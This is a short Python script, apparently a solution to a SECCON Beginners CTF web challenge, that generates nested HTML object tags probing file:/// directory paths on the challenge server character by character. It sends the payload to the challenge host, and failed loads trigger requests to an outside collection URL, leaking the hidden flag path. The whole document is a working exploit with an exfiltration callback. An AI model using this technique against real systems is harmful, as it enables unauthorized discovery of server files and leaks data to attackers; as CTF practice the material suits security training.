import string
import requests

LEAK_URL = "https://end6km9xnaufp.x.pipedream.net"  # Your server URL here

flag_path = ""  # Add leaked flag path here (e.g. "1/2/3/a/b/c/")
# flag_path = "q/c/j/6/p/f/v/b/e/k/8/u/8/4/d/g/f/f/1/l/"

_object = ""
for c in string.ascii_lowercase + string.digits:
    _object += f"""
    <object data="file:///var/www/htmls/ctf/{flag_path}{c}/">
        <object data="{LEAK_URL}/?no=file:///var/www/htmls/ctf/{flag_path}{c}/"></object>
    </object>
    """

html = f"""
<html>
    {_object}
</html>
"""

res = requests.post("https://htmls.beginners.seccon.games", data={"html": html})
assert res.status_code == 200
